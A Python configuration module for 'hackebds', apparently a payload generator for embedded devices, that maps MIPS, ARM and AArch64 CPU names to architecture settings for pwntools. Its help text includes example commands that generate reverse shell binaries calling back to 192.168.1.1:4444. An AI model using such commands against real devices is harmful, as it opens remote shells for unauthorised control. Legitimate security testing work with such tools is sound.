"""
MCPU configuration module for hackebds.
Maps -mcpu values to architecture settings for pwntools.
"""

# MIPS mcpu options (from mips-linux-gnu-as)
MIPS_MCPU_OPTIONS = [
    'mips1', 'mips2', 'mips3', 'mips4', 'mips5',
    'mips32', 'mips32r2', 'mips32r3', 'mips32r5', 'mips32r6',
    'mips64', 'mips64r2', 'mips64r3', 'mips64r5', 'mips64r6',
    'r3000', 'r2000', 'r3900', 'r6000', 'r4000', 'r4010',
    'vr4100', 'vr4111', 'vr4120', 'vr4130', 'vr4181', 'vr4300',
    'r4400', 'r4600', 'orion', 'r4650', 'r5900',
    'loongson2e', 'loongson2f', 'loongson3a',
    'r8000', 'r10000', 'r12000', 'r14000', 'r16000',
    'vr5000', 'vr5400', 'vr5500',
    'rm5200', 'rm5230', 'rm5231', 'rm5261', 'rm5721', 'rm7000', 'rm9000',
    '4kc', '4km', '4kp', '4ksc', '4kec', '4kem', '4kep', '4ksd',
    'm4k', 'm4kp', 'm14k', 'm14kc', 'm14ke', 'm14kec',
    '24kc', '24kf2_1', '24kf', '24kf1_1', '24kfx', '24kx',
    '24kec', '24kef2_1', '24kef', '24kef1_1', '24kefx', '24kex',
    '34kc', '34kf2_1', '34kf', '34kf1_1', '34kfx', '34kx', '34kn',
    '74kc', '74kf2_1', '74kf', '74kf1_1', '74kf3_2', '74kfx', '74kx',
    '1004kc', '1004kf2_1', '1004kf', '1004kf1_1',
    'interaptiv', 'interaptiv-mr2',
    'm5100', 'm5101', 'p5600',
    '5kc', '5kf', '20kc', '25kf',
    'sb1', 'sb1a',
    'gs464', 'gs464e', 'gs264e',
    'octeon', 'octeon+', 'octeon2', 'octeon3',
    'xlr', 'xlp',
    'i6400', 'i6500', 'p6600',
]

# ARM mcpu options (from arm-linux-gnu-as)
ARM_MCPU_OPTIONS = [
    'arm1', 'arm2', 'arm250', 'arm3',
    'arm6', 'arm600', 'arm610', 'arm620',
    'arm7', 'arm70', 'arm700', 'arm700i', 'arm710', 'arm710c', 'arm720',
    'arm7d', 'arm7di', 'arm7m', 'arm7dm', 'arm7dmi',
    'arm7100', 'arm7500', 'arm7500fe',
    'arm7tdmi', 'arm710t', 'arm720t', 'arm740t',
    'arm8', 'arm810',
    'arm9', 'arm9tdmi', 'arm920', 'arm920t', 'arm940', 'arm940t',
    'arm9e', 'arm946e-s', 'arm966e-s', 'arm968e-s',
    'arm926ej-s', 'arm1020e', 'arm1022e', 'arm1026ej-s',
    'arm10tdmi', 'arm10e',
    'arm1136j-s', 'arm1136jf-s', 'arm1156t2-s', 'arm1156t2f-s',
    'arm1176jz-s', 'arm1176jzf-s',
    'cortex-a5', 'cortex-a7', 'cortex-a8', 'cortex-a9',
    'cortex-a12', 'cortex-a15', 'cortex-a17',
    'cortex-a32', 'cortex-a35', 'cortex-a53', 'cortex-a55',
    'cortex-a57', 'cortex-a72', 'cortex-a73', 'cortex-a75', 'cortex-a76',
    'cortex-m0', 'cortex-m0plus', 'cortex-m1', 'cortex-m3', 'cortex-m4', 'cortex-m7',
    'cortex-r4', 'cortex-r4f', 'cortex-r5', 'cortex-r7', 'cortex-r8',
    'strongarm', 'strongarm110', 'strongarm1100', 'strongarm1110',
    'xscale', 'iwmmxt', 'iwmmxt2',
]

# AArch64 mcpu options
AARCH64_MCPU_OPTIONS = [
    'cortex-a35', 'cortex-a53', 'cortex-a55', 'cortex-a57',
    'cortex-a72', 'cortex-a73', 'cortex-a75', 'cortex-a76',
    'neoverse-n1', 'neoverse-e1', 'neoverse-v1',
    'thunderx', 'thunderx2t99',
    'apple-a7', 'apple-a8', 'apple-a9', 'apple-a10', 'apple-a11', 'apple-a12',
]

# ARM mcpu to march mapping
# Maps ARM CPU names to their corresponding architecture versions
ARM_MCPU_TO_MARCH = {
    # ARMv1
    'arm1': 'armv1',
    # ARMv2/ARMv2a
    'arm2': 'armv2',
    'arm250': 'armv2a',
    'arm3': 'armv2a',
    # ARMv3
    'arm6': 'armv3',
    'arm600': 'armv3',
    'arm610': 'armv3',
    'arm620': 'armv3',
    # ARMv3M
    'arm7m': 'armv3m',
    'arm7dm': 'armv3m',
    'arm7dmi': 'armv3m',
    # ARMv4
    'arm7': 'armv4',
    'arm70': 'armv4',
    'arm700': 'armv4',
    'arm700i': 'armv4',
    'arm710': 'armv4',
    'arm710c': 'armv4',
    'arm720': 'armv4',
    'arm7d': 'armv4',
    'arm7di': 'armv4',
    'arm7100': 'armv4',
    'arm7500': 'armv4',
    'arm7500fe': 'armv4',
    'arm8': 'armv4',
    'arm810': 'armv4',
    'strongarm': 'armv4',
    'strongarm110': 'armv4',
    'strongarm1100': 'armv4',
    'strongarm1110': 'armv4',
    # ARMv4T
    'arm7tdmi': 'armv4t',
    'arm710t': 'armv4t',
    'arm720t': 'armv4t',
    'arm740t': 'armv4t',
    'arm9': 'armv4t',
    'arm9tdmi': 'armv4t',
    'arm920': 'armv4t',
    'arm920t': 'armv4t',
    'arm940': 'armv4t',
    'arm940t': 'armv4t',
    # ARMv5T
    'arm10tdmi': 'armv5t',
    # ARMv5TE
    'arm9e': 'armv5te',
    'arm946e-s': 'armv5te',
    'arm966e-s': 'armv5te',
    'arm968e-s': 'armv5te',
    'arm10e': 'armv5te',
    'arm1020e': 'armv5te',
    'arm1022e': 'armv5te',
    'xscale': 'armv5te',
    'iwmmxt': 'armv5te',
    'iwmmxt2': 'armv5te',
    # ARMv5TEJ
    'arm926ej-s': 'armv5tej',
    'arm1026ej-s': 'armv5tej',
    # ARMv6
    'arm1136j-s': 'armv6',
    'arm1136jf-s': 'armv6',
    # ARMv6T2
    'arm1156t2-s': 'armv6t2',
    'arm1156t2f-s': 'armv6t2',
    # ARMv6Z/ARMv6ZK
    'arm1176jz-s': 'armv6zk',
    'arm1176jzf-s': 'armv6zk',
    # ARMv6-M (Cortex-M0/M0+/M1)
    'cortex-m0': 'armv6-m',
    'cortex-m0plus': 'armv6-m',
    'cortex-m1': 'armv6-m',
    # ARMv7-M (Cortex-M3)
    'cortex-m3': 'armv7-m',
    # ARMv7E-M (Cortex-M4/M7)
    'cortex-m4': 'armv7e-m',
    'cortex-m7': 'armv7e-m',
    # ARMv7-R (Cortex-R series)
    'cortex-r4': 'armv7-r',
    'cortex-r4f': 'armv7-r',
    'cortex-r5': 'armv7-r',
    'cortex-r7': 'armv7-r',
    'cortex-r8': 'armv7-r',
    # ARMv7-A (Cortex-A series)
    'cortex-a5': 'armv7-a',
    'cortex-a7': 'armv7-a',
    'cortex-a8': 'armv7-a',
    'cortex-a9': 'armv7-a',
    'cortex-a12': 'armv7-a',
    'cortex-a15': 'armv7-a',
    'cortex-a17': 'armv7-a',
    # ARMv8-A (32-bit mode, Cortex-A32/A35 etc in AArch32)
    'cortex-a32': 'armv8-a',
    'cortex-a35': 'armv8-a',
    'cortex-a53': 'armv8-a',
    'cortex-a55': 'armv8-a',
    'cortex-a57': 'armv8-a',
    'cortex-a72': 'armv8-a',
    'cortex-a73': 'armv8-a',
    'cortex-a75': 'armv8-a',
    'cortex-a76': 'armv8-a',
}

# ARM march to hackebds arch mapping
# Maps ARM architecture versions to the appropriate hackebds arch type
ARM_MARCH_TO_HACKEBDS_ARCH = {
    # Pre-v5: Use armv5 as minimum supported
    'armv1': {'arch_suffix': 'v5', 'supported': False, 'reason': 'armv1 is too old, minimum supported is armv5'},
    'armv2': {'arch_suffix': 'v5', 'supported': False, 'reason': 'armv2 is too old, minimum supported is armv5'},
    'armv2a': {'arch_suffix': 'v5', 'supported': False, 'reason': 'armv2a is too old, minimum supported is armv5'},
    'armv3': {'arch_suffix': 'v5', 'supported': False, 'reason': 'armv3 is too old, minimum supported is armv5'},
    'armv3m': {'arch_suffix': 'v5', 'supported': False, 'reason': 'armv3m is too old, minimum supported is armv5'},
    'armv4': {'arch_suffix': 'v5', 'supported': False, 'reason': 'armv4 is too old, minimum supported is armv5'},
    'armv4t': {'arch_suffix': 'v5', 'supported': False, 'reason': 'armv4t is too old, minimum supported is armv5'},
    # ARMv5: Supported
    'armv5t': {'arch_suffix': 'v5', 'supported': True},
    'armv5te': {'arch_suffix': 'v5', 'supported': True},
    'armv5tej': {'arch_suffix': 'v5', 'supported': True},
    # ARMv6: Use armv5 for better compatibility
    'armv6': {'arch_suffix': 'v5', 'supported': True},
    'armv6t2': {'arch_suffix': 'v5', 'supported': True},
    'armv6z': {'arch_suffix': 'v5', 'supported': True},
    'armv6zk': {'arch_suffix': 'v5', 'supported': True},
    'armv6-m': {'arch_suffix': 'v5', 'supported': True},
    # ARMv7: Use armv7
    'armv7': {'arch_suffix': 'v7', 'supported': True},
    'armv7-a': {'arch_suffix': 'v7', 'supported': True},
    'armv7-r': {'arch_suffix': 'v7', 'supported': True},
    'armv7-m': {'arch_suffix': 'v7', 'supported': True},
    'armv7e-m': {'arch_suffix': 'v7', 'supported': True},
    # ARMv8 (32-bit): Use armv7
    'armv8-a': {'arch_suffix': 'v7', 'supported': True},
}

# MIPS 64-bit mcpu values
MIPS64_MCPU_VALUES = [
    'mips3', 'mips4', 'mips5', 'mips64', 'mips64r2', 'mips64r3', 'mips64r5', 'mips64r6',
    'r4000', 'r4400', 'r8000', 'r10000', 'r12000', 'r14000', 'r16000',
    'vr4100', 'vr4111', 'vr4120', 'vr4130', 'vr4181', 'vr4300',
    'vr5000', 'vr5400', 'vr5500',
    '5kc', '5kf', '20kc', '25kf',
    'sb1', 'sb1a', 'loongson3a',
    'octeon', 'octeon+', 'octeon2', 'octeon3',
    'i6400', 'i6500', 'p6600',
]

# MIPS mcpu to march mapping
# Maps MIPS CPU names to their corresponding ISA versions
MIPS_MCPU_TO_MARCH = {
    # MIPS I
    'mips1': 'mips1',
    'r2000': 'mips1',
    'r3000': 'mips1',
    'r3900': 'mips1',
    # MIPS II
    'mips2': 'mips2',
    'r6000': 'mips2',
    # MIPS III (64-bit)
    'mips3': 'mips3',
    'r4000': 'mips3',
    'r4010': 'mips3',
    'r4400': 'mips3',
    'r4600': 'mips3',
    'orion': 'mips3',
    'r4650': 'mips3',
    'vr4100': 'mips3',
    'vr4111': 'mips3',
    'vr4120': 'mips3',
    'vr4130': 'mips3',
    'vr4181': 'mips3',
    'vr4300': 'mips3',
    'loongson2e': 'mips3',
    'loongson2f': 'mips3',
    # MIPS IV (64-bit)
    'mips4': 'mips4',
    'r8000': 'mips4',
    'r10000': 'mips4',
    'r12000': 'mips4',
    'r14000': 'mips4',
    'r16000': 'mips4',
    'vr5000': 'mips4',
    'vr5400': 'mips4',
    'vr5500': 'mips4',
    'rm5200': 'mips4',
    'rm5230': 'mips4',
    'rm5231': 'mips4',
    'rm5261': 'mips4',
    'rm5721': 'mips4',
    'rm7000': 'mips4',
    'rm9000': 'mips4',
    # MIPS V (64-bit)
    'mips5': 'mips5',
    # MIPS32
    'mips32': 'mips32',
    '4kc': 'mips32',
    '4km': 'mips32',
    '4kp': 'mips32',
    '4ksc': 'mips32',
    'm4k': 'mips32',
    'm4kp': 'mips32',
    # MIPS32 Release 2
    'mips32r2': 'mips32r2',
    '4kec': 'mips32r2',
    '4kem': 'mips32r2',
    '4kep': 'mips32r2',
    '4ksd': 'mips32r2',
    '24kc': 'mips32r2',
    '24kf2_1': 'mips32r2',
    '24kf': 'mips32r2',
    '24kf1_1': 'mips32r2',
    '24kfx': 'mips32r2',
    '24kx': 'mips32r2',
    '24kec': 'mips32r2',
    '24kef2_1': 'mips32r2',
    '24kef': 'mips32r2',
    '24kef1_1': 'mips32r2',
    '24kefx': 'mips32r2',
    '24kex': 'mips32r2',
    '34kc': 'mips32r2',
    '34kf2_1': 'mips32r2',
    '34kf': 'mips32r2',
    '34kf1_1': 'mips32r2',
    '34kfx': 'mips32r2',
    '34kx': 'mips32r2',
    '34kn': 'mips32r2',
    '74kc': 'mips32r2',
    '74kf2_1': 'mips32r2',
    '74kf': 'mips32r2',
    '74kf1_1': 'mips32r2',
    '74kf3_2': 'mips32r2',
    '74kfx': 'mips32r2',
    '74kx': 'mips32r2',
    '1004kc': 'mips32r2',
    '1004kf2_1': 'mips32r2',
    '1004kf': 'mips32r2',
    '1004kf1_1': 'mips32r2',
    'interaptiv': 'mips32r2',
    'interaptiv-mr2': 'mips32r2',
    'm14k': 'mips32r2',
    'm14kc': 'mips32r2',
    'm14ke': 'mips32r2',
    'm14kec': 'mips32r2',
    'm5100': 'mips32r2',
    'm5101': 'mips32r2',
    'r5900': 'mips32r2',
    # MIPS32 Release 3
    'mips32r3': 'mips32r3',
    # MIPS32 Release 5
    'mips32r5': 'mips32r5',
    'p5600': 'mips32r5',
    # MIPS32 Release 6
    'mips32r6': 'mips32r6',
    # MIPS64
    'mips64': 'mips64',
    '5kc': 'mips64',
    '5kf': 'mips64',
    '20kc': 'mips64',
    '25kf': 'mips64',
    'sb1': 'mips64',
    'sb1a': 'mips64',
    'loongson3a': 'mips64',
    # MIPS64 Release 2
    'mips64r2': 'mips64r2',
    'octeon': 'mips64r2',
    'octeon+': 'mips64r2',
    'octeon2': 'mips64r2',
    'octeon3': 'mips64r2',
    'gs464': 'mips64r2',
    'gs464e': 'mips64r2',
    'gs264e': 'mips64r2',
    'xlr': 'mips64r2',
    'xlp': 'mips64r2',
    # MIPS64 Release 3
    'mips64r3': 'mips64r3',
    # MIPS64 Release 5
    'mips64r5': 'mips64r5',
    # MIPS64 Release 6
    'mips64r6': 'mips64r6',
    'i6400': 'mips64r6',
    'i6500': 'mips64r6',
    'p6600': 'mips64r6',
}


def get_arch_from_mcpu(mcpu: str) -> dict:
    """
    Determine architecture settings from mcpu value.

    Returns:
        dict with 'arch_type' ('mips', 'arm', 'aarch64'),
        'pwntools_arch', 'bits', 'march_flag', 'mcpu_flag',
        'arch_suffix' (for ARM: 'v5' or 'v7'),
        'march' (the architecture version string),
        'supported' (bool), 'warning' (optional warning message)
    """
    mcpu_lower = mcpu.lower()

    # Check MIPS
    if mcpu_lower in [m.lower() for m in MIPS_MCPU_OPTIONS]:
        is_64bit = mcpu_lower in [m.lower() for m in MIPS64_MCPU_VALUES]
        # Get the proper march from MIPS_MCPU_TO_MARCH mapping
        march = MIPS_MCPU_TO_MARCH.get(mcpu_lower)
        if not march:
            # Fallback: if mcpu starts with 'mips', use it directly
            if mcpu_lower.startswith('mips'):
                march = mcpu_lower
            else:
                # Default based on bits
                march = 'mips64r2' if is_64bit else 'mips32r2'

        return {
            'arch_type': 'mips',
            'pwntools_arch': 'mips64' if is_64bit else 'mips',
            'bits': 64 if is_64bit else 32,
            'march_flag': f'-march={march}',
            'march': march,
            'mcpu_flag': None,
            'supported': True,
        }

    # Check ARM 32-bit
    if mcpu_lower in [m.lower() for m in ARM_MCPU_OPTIONS]:
        # Get the corresponding march for this mcpu
        march = ARM_MCPU_TO_MARCH.get(mcpu_lower)
        arch_info = ARM_MARCH_TO_HACKEBDS_ARCH.get(march, {'arch_suffix': 'v7', 'supported': True})

        result = {
            'arch_type': 'arm',
            'pwntools_arch': 'arm',
            'bits': 32,
            'march_flag': f'-march={march}' if march else None,
            'march': march,
            'mcpu_flag': f'-mcpu={mcpu_lower}',
            'arch_suffix': arch_info.get('arch_suffix', 'v7'),
            'supported': arch_info.get('supported', True),
        }

        # Add warning if architecture is not fully supported
        if not arch_info.get('supported', True):
            result['warning'] = arch_info.get('reason', f'{mcpu_lower} may not be fully supported')

        return result

    # Check AArch64
    if mcpu_lower in [m.lower() for m in AARCH64_MCPU_OPTIONS]:
        return {
            'arch_type': 'aarch64',
            'pwntools_arch': 'aarch64',
            'bits': 64,
            'march_flag': None,
            'march': 'armv8-a',
            'mcpu_flag': f'-mcpu={mcpu_lower}',
            'supported': True,
        }

    return None


def is_valid_mcpu(mcpu: str) -> bool:
    """Check if mcpu value is valid."""
    return get_arch_from_mcpu(mcpu) is not None


def get_mcpu_help_text() -> str:
    """Generate help text for mcpu options."""
    help_text = """
MCPU Options:

MIPS Architecture (-mcpu with -li/-bi):
  Basic: mips1, mips2, mips3, mips4, mips5
  MIPS32: mips32, mips32r2, mips32r3, mips32r5, mips32r6
  MIPS64: mips64, mips64r2, mips64r3, mips64r5, mips64r6
  Classic: r2000, r3000, r3900, r4000, r4400, r4600, r5900
  VR series: vr4100, vr4300, vr5000, vr5400, vr5500
  MTI cores: 4kc, 4kec, 24kc, 24kf, 34kc, 74kc, 1004kc
  Modern: m14k, m5100, p5600, i6400, i6500, p6600
  Loongson: loongson2e, loongson2f, loongson3a
  Cavium: octeon, octeon2, octeon3

ARM Architecture (-mcpu with -li/-bi):
  Classic: arm7tdmi, arm9tdmi, arm920t, arm926ej-s
  ARM11: arm1136jf-s, arm1176jzf-s
  Cortex-A: cortex-a5, cortex-a7, cortex-a8, cortex-a9, cortex-a15
  Cortex-M: cortex-m0, cortex-m3, cortex-m4, cortex-m7
  Cortex-R: cortex-r4, cortex-r5, cortex-r7
  XScale: xscale, iwmmxt, strongarm

AArch64 Architecture (-mcpu, always little-endian):
  Cortex-A: cortex-a35, cortex-a53, cortex-a55, cortex-a57, cortex-a72, cortex-a73
  Neoverse: neoverse-n1, neoverse-e1

Examples:
  hackebds -mcpu mips32r2 -li -reverse_ip 192.168.1.1 -reverse_port 4444 -res reverse_shell_file
  hackebds -mcpu arm926ej-s -li -reverse_ip 192.168.1.1 -reverse_port 4444 -res reverse_shell_file
  hackebds -mcpu cortex-a53 -reverse_ip 192.168.1.1 -reverse_port 4444 -res reverse_shell_file
"""
    return help_text


def print_all_mcpu_options():
    """Print all supported mcpu options."""
    print("\n=== MIPS MCPU Options ===")
    print("32-bit MIPS:")
    mips32 = [m for m in MIPS_MCPU_OPTIONS if m.lower() not in [x.lower() for x in MIPS64_MCPU_VALUES]]
    for i in range(0, len(mips32), 8):
        print("  " + ", ".join(mips32[i:i+8]))

    print("\n64-bit MIPS:")
    for i in range(0, len(MIPS64_MCPU_VALUES), 8):
        print("  " + ", ".join(MIPS64_MCPU_VALUES[i:i+8]))

    print("\n=== ARM MCPU Options ===")
    for i in range(0, len(ARM_MCPU_OPTIONS), 8):
        print("  " + ", ".join(ARM_MCPU_OPTIONS[i:i+8]))

    print("\n=== AArch64 MCPU Options ===")
    for i in range(0, len(AARCH64_MCPU_OPTIONS), 8):
        print("  " + ", ".join(AARCH64_MCPU_OPTIONS[i:i+8]))
